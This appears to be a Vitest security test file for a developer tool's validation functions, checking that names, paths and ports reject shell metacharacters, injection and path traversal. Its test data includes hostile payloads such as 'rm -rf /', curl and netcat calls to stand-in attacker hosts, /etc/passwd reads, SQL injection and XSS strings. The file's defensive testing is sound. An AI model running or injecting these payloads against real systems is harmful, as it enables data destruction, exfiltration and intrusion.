import { describe, it, expect } from 'vitest';
import {
  ValidationError,
  validateProjectName,
  validateServiceName,
  validateServiceType,
  validatePort,
  validateBranchName,
  validateWorktreePath,
  validateScriptPath,
  validateServices,
  validateTemplatePath,
  validateOutputPath,
  validateFilePath,
  sanitizeForDisplay,
} from '../src/validation.js';
import { existsSync, mkdirSync, writeFileSync, rmSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';

describe('Security Input Validation', () => {
  let testDir: string;

  beforeEach(() => {
    // Create a test directory for file-based tests
    testDir = join(tmpdir(), 'security-validation-test-' + Date.now());
    mkdirSync(testDir, { recursive: true });
  });

  afterEach(() => {
    // Clean up test directory
    if (existsSync(testDir)) {
      rmSync(testDir, { recursive: true, force: true });
    }
  });

  describe('Command Injection Prevention', () => {
    describe('validateProjectName', () => {
      it('should accept valid project names', () => {
        expect(validateProjectName('my-project')).toBe('my-project');
        expect(validateProjectName('Project_123')).toBe('Project_123');
        expect(validateProjectName('app.test')).toBe('app.test');
      });

      it('should reject shell metacharacters', () => {
        expect(() => validateProjectName('project; rm -rf /')).toThrow(
          ValidationError
        );
        expect(() => validateProjectName('project && echo')).toThrow(
          ValidationError
        );
        expect(() => validateProjectName('project | cat')).toThrow(
          ValidationError
        );
        expect(() => validateProjectName('project`whoami`')).toThrow(
          ValidationError
        );
        expect(() => validateProjectName('project$(id)')).toThrow(
          ValidationError
        );
        expect(() => validateProjectName('project"test"')).toThrow(
          ValidationError
        );
        expect(() => validateProjectName("project'test'")).toThrow(
          ValidationError
        );
        expect(() => validateProjectName('project\\test')).toThrow(
          ValidationError
        );
        expect(() => validateProjectName('project*')).toThrow(ValidationError);
        expect(() => validateProjectName('project?')).toThrow(ValidationError);
        expect(() => validateProjectName('project~')).toThrow(ValidationError);
        expect(() => validateProjectName('project<test')).toThrow(
          ValidationError
        );
        expect(() => validateProjectName('project>test')).toThrow(
          ValidationError
        );
        expect(() => validateProjectName('project()')).toThrow(ValidationError);
        expect(() => validateProjectName('project{}')).toThrow(ValidationError);
        expect(() => validateProjectName('project[]')).toThrow(ValidationError);
      });

      it('should reject names starting with dangerous characters', () => {
        expect(() => validateProjectName('.hidden')).toThrow(ValidationError);
        expect(() => validateProjectName('-flag')).toThrow(ValidationError);
      });

      it('should reject overly long names', () => {
        const longName = 'a'.repeat(51);
        expect(() => validateProjectName(longName)).toThrow(ValidationError);
      });

      it('should reject empty or invalid types', () => {
        expect(() => validateProjectName('')).toThrow(ValidationError);
        expect(() => validateProjectName(null as any)).toThrow(ValidationError);
        expect(() => validateProjectName(undefined as any)).toThrow(
          ValidationError
        );
        expect(() => validateProjectName(123 as any)).toThrow(ValidationError);
      });
    });

    describe('validateBranchName', () => {
      it('should accept valid branch names', () => {
        expect(validateBranchName('feature/auth')).toBe('feature/auth');
        expect(validateBranchName('bugfix-123')).toBe('bugfix-123');
        expect(validateBranchName('release_v1.0')).toBe('release_v1.0');
      });

      it('should reject shell metacharacters', () => {
        expect(() => validateBranchName('branch; rm -rf /')).toThrow(
          ValidationError
        );
        expect(() => validateBranchName('branch && echo')).toThrow(
          ValidationError
        );
        expect(() => validateBranchName('branch | cat')).toThrow(
          ValidationError
        );
        expect(() => validateBranchName('branch`whoami`')).toThrow(
          ValidationError
        );
        expect(() => validateBranchName('branch$(id)')).toThrow(
          ValidationError
        );
      });

      it('should reject invalid git branch names', () => {
        expect(() => validateBranchName('-invalid')).toThrow(ValidationError);
        expect(() => validateBranchName('branch.')).toThrow(ValidationError);
        expect(() => validateBranchName('branch..test')).toThrow(
          ValidationError
        );
        expect(() => validateBranchName('branch with spaces')).toThrow(
          ValidationError
        );
      });

      it('should reject overly long branch names', () => {
        const longName = 'a'.repeat(101);
        expect(() => validateBranchName(longName)).toThrow(ValidationError);
      });
    });

    describe('validateWorktreePath', () => {
      it('should accept valid paths', () => {
        expect(validateWorktreePath('../feature-branch')).toBe(
          '../feature-branch'
        );
        expect(validateWorktreePath('/tmp/worktree')).toBe('/tmp/worktree');
        expect(validateWorktreePath('./local-branch')).toBe('local-branch'); // normalize() removes './'
      });

      it('should reject shell metacharacters', () => {
        expect(() => validateWorktreePath('../test; rm -rf /')).toThrow(
          ValidationError
        );
        expect(() => validateWorktreePath('../test && echo')).toThrow(
          ValidationError
        );
        expect(() => validateWorktreePath('../test | cat')).toThrow(
          ValidationError
        );
        expect(() => validateWorktreePath('../test`whoami`')).toThrow(
          ValidationError
        );
        expect(() => validateWorktreePath('../test$(id)')).toThrow(
          ValidationError
        );
        expect(() => validateWorktreePath('../test"path"')).toThrow(
          ValidationError
        );
        expect(() => validateWorktreePath("../test'path'")).toThrow(
          ValidationError
        );
      });

      it('should reject null bytes and control characters', () => {
        expect(() => validateWorktreePath('../test\0')).toThrow(
          ValidationError
        );
        expect(() => validateWorktreePath('../test\n')).toThrow(
          ValidationError
        );
        expect(() => validateWorktreePath('../test\r')).toThrow(
          ValidationError
        );
      });

      it('should reject system directory paths', () => {
        expect(() => validateWorktreePath('/dev/null')).toThrow(
          ValidationError
        );
        expect(() => validateWorktreePath('/proc/self')).toThrow(
          ValidationError
        );
        expect(() => validateWorktreePath('/sys/class')).toThrow(
          ValidationError
        );
      });

      it('should reject overly long paths', () => {
        const longPath = '/tmp/' + 'a'.repeat(300);
        expect(() => validateWorktreePath(longPath)).toThrow(ValidationError);
      });
    });
  });

  describe('Path Traversal Prevention', () => {
    describe('validateTemplatePath', () => {
      it('should accept valid template paths that exist', () => {
        const templatePath = join(testDir, 'test.devports');
        writeFileSync(templatePath, 'DEVPORTS_PROJECT_NAME=test');
        expect(validateTemplatePath(templatePath)).toBe(templatePath);
      });

      it('should reject non-existent files', () => {
        const nonExistentPath = join(testDir, 'nonexistent.devports');
        expect(() => validateTemplatePath(nonExistentPath)).toThrow(
          ValidationError
        );
      });

      it('should reject invalid extensions', () => {
        const invalidPath = join(testDir, 'test.txt');
        writeFileSync(invalidPath, 'content');
        expect(() => validateTemplatePath(invalidPath)).toThrow(
          ValidationError
        );
      });

      it('should prevent path traversal', () => {
        expect(() => validateTemplatePath('../../../etc/passwd')).toThrow(
          ValidationError
        );
        expect(() => validateTemplatePath('/etc/passwd')).toThrow(
          ValidationError
        );
      });
    });

    describe('validateScriptPath', () => {
      it('should accept valid executable scripts', () => {
        const scriptPath = join(testDir, 'test.sh');
        writeFileSync(scriptPath, '#!/bin/bash\necho "test"', { mode: 0o755 });
        expect(validateScriptPath(scriptPath)).toBe(scriptPath);
      });

      it('should reject non-executable files on Unix-like systems', () => {
        if (process.platform !== 'win32') {
          const scriptPath = join(testDir, 'test.sh');
          writeFileSync(scriptPath, '#!/bin/bash\necho "test"', {
            mode: 0o644,
          });
          expect(() => validateScriptPath(scriptPath)).toThrow(ValidationError);
        }
      });

      it('should reject invalid script extensions', () => {
        const invalidPath = join(testDir, 'test.doc');
        writeFileSync(invalidPath, 'content', { mode: 0o755 });
        expect(() => validateScriptPath(invalidPath)).toThrow(ValidationError);
      });

      it('should prevent path traversal', () => {
        expect(() => validateScriptPath('../../../bin/sh')).toThrow(
          ValidationError
        );
        expect(() => validateScriptPath('/bin/sh')).toThrow(ValidationError);
      });
    });
  });

  describe('Service Validation', () => {
    describe('validateServiceType', () => {
      it('should accept valid service types', () => {
        expect(validateServiceType('postgres')).toBe('postgres');
        expect(validateServiceType('mysql')).toBe('mysql');
        expect(validateServiceType('redis')).toBe('redis');
        expect(validateServiceType('api')).toBe('api');
        expect(validateServiceType('app')).toBe('app');
        expect(validateServiceType('custom')).toBe('custom');
        expect(validateServiceType('POSTGRES')).toBe('postgres'); // Case insensitive
      });

      it('should reject invalid service types', () => {
        expect(() => validateServiceType('invalid')).toThrow(ValidationError);
        expect(() => validateServiceType('hack')).toThrow(ValidationError);
        expect(() => validateServiceType('')).toThrow(ValidationError);
        expect(() => validateServiceType('postgres; rm -rf /')).toThrow(
          ValidationError
        );
      });
    });

    describe('validateServices', () => {
      it('should accept valid service arrays', () => {
        const result = validateServices(['postgres', 'redis:redis', 'api:api']);
        expect(result).toEqual([
          { service: 'postgres', type: 'postgres' },
          { service: 'redis', type: 'redis' },
          { service: 'api', type: 'api' },
        ]);
      });

      it('should reject too many services', () => {
        const manyServices = Array(11).fill('postgres');
        expect(() => validateServices(manyServices)).toThrow(ValidationError);
      });

      it('should reject empty arrays', () => {
        expect(() => validateServices([])).toThrow(ValidationError);
      });

      it('should reject invalid service formats', () => {
        expect(() => validateServices(['postgres:mysql:extra'])).toThrow(
          ValidationError
        );
        expect(() => validateServices(['postgres; rm -rf /'])).toThrow(
          ValidationError
        );
      });

      it('should reject non-array input', () => {
        expect(() => validateServices('postgres' as any)).toThrow(
          ValidationError
        );
        expect(() => validateServices(null as any)).toThrow(ValidationError);
      });
    });
  });

  describe('Port Validation', () => {
    describe('validatePort', () => {
      it('should accept valid port numbers', () => {
        expect(validatePort(3000)).toBe(3000);
        expect(validatePort('5432')).toBe(5432);
        expect(validatePort('65535')).toBe(65535);
      });

      it('should reject invalid port ranges', () => {
        expect(() => validatePort(1023)).toThrow(ValidationError);
        expect(() => validatePort(65536)).toThrow(ValidationError);
        expect(() => validatePort(-1)).toThrow(ValidationError);
        expect(() => validatePort(0)).toThrow(ValidationError);
      });

      it('should reject non-numeric values', () => {
        expect(() => validatePort('abc')).toThrow(ValidationError);
        expect(() => validatePort('3000; rm -rf /')).toThrow(ValidationError);
        expect(() => validatePort('')).toThrow(ValidationError);
        expect(() => validatePort(null as any)).toThrow(ValidationError);
      });
    });
  });

  describe('Output Sanitization', () => {
    describe('sanitizeForDisplay', () => {
      it('should remove control characters', () => {
        expect(sanitizeForDisplay('test\x00null')).toBe('testnull');
        expect(sanitizeForDisplay('test\x01control')).toBe('testcontrol');
        expect(sanitizeForDisplay('test\x1Fcontrol')).toBe('testcontrol');
        expect(sanitizeForDisplay('test\x7Fdel')).toBe('testdel');
      });

      it('should limit length', () => {
        const longString = 'a'.repeat(200);
        const result = sanitizeForDisplay(longString, 50);
        expect(result).toHaveLength(50);
        expect(result).toBe('a'.repeat(50));
      });

      it('should handle empty and null inputs', () => {
        expect(sanitizeForDisplay('')).toBe('');
        expect(sanitizeForDisplay(null as any)).toBe('');
        expect(sanitizeForDisplay(undefined as any)).toBe('');
      });

      it('should preserve normal text', () => {
        expect(sanitizeForDisplay('normal text 123')).toBe('normal text 123');
        expect(sanitizeForDisplay('path/to/file.js')).toBe('path/to/file.js');
      });
    });
  });

  describe('Injection Attack Patterns', () => {
    const commandInjectionPayloads = [
      // Command injection
      '; rm -rf /',
      '&& curl malicious.com',
      '| nc attacker.com 1234',
      '`whoami`',
      '$(id)',
      '> /tmp/exploit',
      '< /etc/passwd',
    ];

    const allInjectionPayloads = [
      ...commandInjectionPayloads,

      // SQL injection patterns
      "'; DROP TABLE users; --",
      '" OR 1=1 --',

      // Script injection
      '<script>alert("xss")</script>',
      'javascript:alert(1)',

      // Null bytes and control chars
      'test\0',
      'test\n\r',

      // Unicode and encoding attacks
      'test\u0000',
      'test%00',
      'test\x00',
    ];

    const pathTraversalPayloads = [
      // Path traversal
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\hosts',
    ];

    it('should reject all common injection payloads in project names', () => {
      allInjectionPayloads.forEach((payload) => {
        expect(() => validateProjectName(`project${payload}`)).toThrow(
          ValidationError
        );
      });
    });

    it('should reject all common injection payloads in branch names', () => {
      allInjectionPayloads.forEach((payload) => {
        expect(() => validateBranchName(`branch${payload}`)).toThrow(
          ValidationError
        );
      });
    });

    it('should reject command injection payloads in worktree paths', () => {
      commandInjectionPayloads.forEach((payload) => {
        expect(() => validateWorktreePath(`../path${payload}`)).toThrow(
          ValidationError
        );
      });
    });

    it('should reject path traversal in worktree paths', () => {
      pathTraversalPayloads.forEach((payload) => {
        expect(() => validateWorktreePath(payload)).toThrow(ValidationError);
      });
    });
  });

  describe('Edge Cases and Error Conditions', () => {
    it('should handle very large inputs gracefully', () => {
      const hugeString = 'a'.repeat(1000000);
      expect(() => validateProjectName(hugeString)).toThrow(ValidationError);
      expect(() => validateBranchName(hugeString)).toThrow(ValidationError);
    });

    it('should handle unicode and international characters appropriately', () => {
      // Project names with unicode should be rejected (since we only allow ASCII)
      expect(() => validateProjectName('プロジェクト')).toThrow(
        ValidationError
      );
      expect(() => validateProjectName('проект')).toThrow(ValidationError);
      expect(() => validateBranchName('ブランチ')).toThrow(ValidationError);
    });

    it('should handle different input types consistently', () => {
      const invalidTypes = [null, undefined, {}, [], 123, true, Symbol('test')];

      invalidTypes.forEach((invalid) => {
        expect(() => validateProjectName(invalid as any)).toThrow(
          ValidationError
        );
        expect(() => validateServiceName(invalid as any)).toThrow(
          ValidationError
        );
        expect(() => validateBranchName(invalid as any)).toThrow(
          ValidationError
        );
      });
    });

    it('should provide meaningful error messages', () => {
      try {
        validateProjectName('project; rm -rf /');
        expect.fail('Should have thrown');
      } catch (error) {
        expect(error).toBeInstanceOf(ValidationError);
        expect(error.message).toContain('can only contain');
      }

      try {
        validatePort('99999');
        expect.fail('Should have thrown');
      } catch (error) {
        expect(error).toBeInstanceOf(ValidationError);
        expect(error.message).toContain('must be between');
      }
    });
  });

  describe('Missing Coverage Cases', () => {
    describe('validateOutputPath', () => {
      it('should validate output paths', () => {
        expect(() => validateOutputPath('output.txt')).not.toThrow();
        expect(() => validateOutputPath('./relative/output.txt')).not.toThrow();
      });
    });

    describe('Shell metacharacter enforcement', () => {
      it('should reject shell metacharacters when not explicitly allowed', () => {
        expect(() =>
          validateFilePath('file;rm-rf', { allowShellMetachars: false })
        ).toThrow('dangerous characters');
      });
    });
  });
});
